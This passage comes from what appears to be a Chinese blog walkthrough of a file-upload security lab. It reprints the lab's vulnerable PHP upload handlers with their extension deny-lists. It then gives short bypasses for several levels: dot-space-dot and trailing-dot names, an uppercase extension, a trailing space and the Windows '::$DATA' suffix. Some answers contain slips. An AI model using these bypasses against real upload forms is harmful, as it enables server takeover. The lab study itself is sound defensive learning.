class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.date(<span class="string">&quot;YmdHis&quot;</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="源码10"><a href="#源码10" class="headerlink" title="源码10:"></a>源码10:</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="解答：-4"><a href="#解答：-4" class="headerlink" title="解答："></a>解答：</h3><p>全ban完了，用.{空格}.绕过</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">filename &#x3D; &quot;phpinfo.php. . &quot;</span><br></pre></td></tr></table></figure>
<p>访问 phpinfo.php 即可</p>
<h2 id="level-6-大小写绕过"><a href="#level-6-大小写绕过" class="headerlink" title="level-6(大小写绕过)"></a>level-6(大小写绕过)</h2><h3 id="源码：-4"><a href="#源码：-4" class="headerlink" title="源码："></a>源码：</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.date(<span class="string">&quot;YmdHis&quot;</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="解答：-5"><a href="#解答：-5" class="headerlink" title="解答："></a>解答：</h3><p>没有防大小写，直接后缀名改成PHP一把梭了。、</p>
<h2 id="level-7-空格绕过"><a href="#level-7-空格绕过" class="headerlink" title="level-7(空格绕过)"></a>level-7(空格绕过)</h2><h3 id="源码：-5"><a href="#源码：-5" class="headerlink" title="源码："></a>源码：</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        <span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.date(<span class="string">&quot;YmdHis&quot;</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件不允许上传&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="解答：-6"><a href="#解答：-6" class="headerlink" title="解答："></a>解答：</h3><p>空格绕过，上传 <code>phpinfo.php</code> ，访问<code>phpinfo.php.</code></p>
<p>00截断的php版本要求是小于5.3.29</p>
<h2 id="level-8-点绕过"><a href="#level-8-点绕过" class="headerlink" title="level-8(点绕过)"></a>level-8(点绕过)</h2><h3 id="源码：-6"><a href="#源码：-6" class="headerlink" title="源码："></a>源码：</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="解答：-7"><a href="#解答：-7" class="headerlink" title="解答："></a>解答：</h3><p>.绕过，穿上<code>phpinfo.php.</code>，访问<code>php.</code>即可。</p>
<h2 id="level-9-DATA绕过"><a href="#level-9-DATA绕过" class="headerlink" title="level-9(::$DATA绕过)"></a>level-9(::$DATA绕过)</h2><h3 id="源码"><a href="#源码" class="headerlink" title="源码:"></a>源码:</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.date(<span class="string">&quot;YmdHis&quot;</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="解答：-8"><a href="#解答：-8" class="headerlink" title="解答："></a>解答：</h3><p>可以发现没有去除字符串::$DATA</p>
<p>思路：同第六题一样，利用windows的特性，这里黑名单没有过滤<code>::$DATA</code>，因此上传<code>xx.php::$DATA</code>，上传成功后windows会自动去除<code>::$DATA</code></p>
<p>上传文件<code>.php::$DATA</code></p>
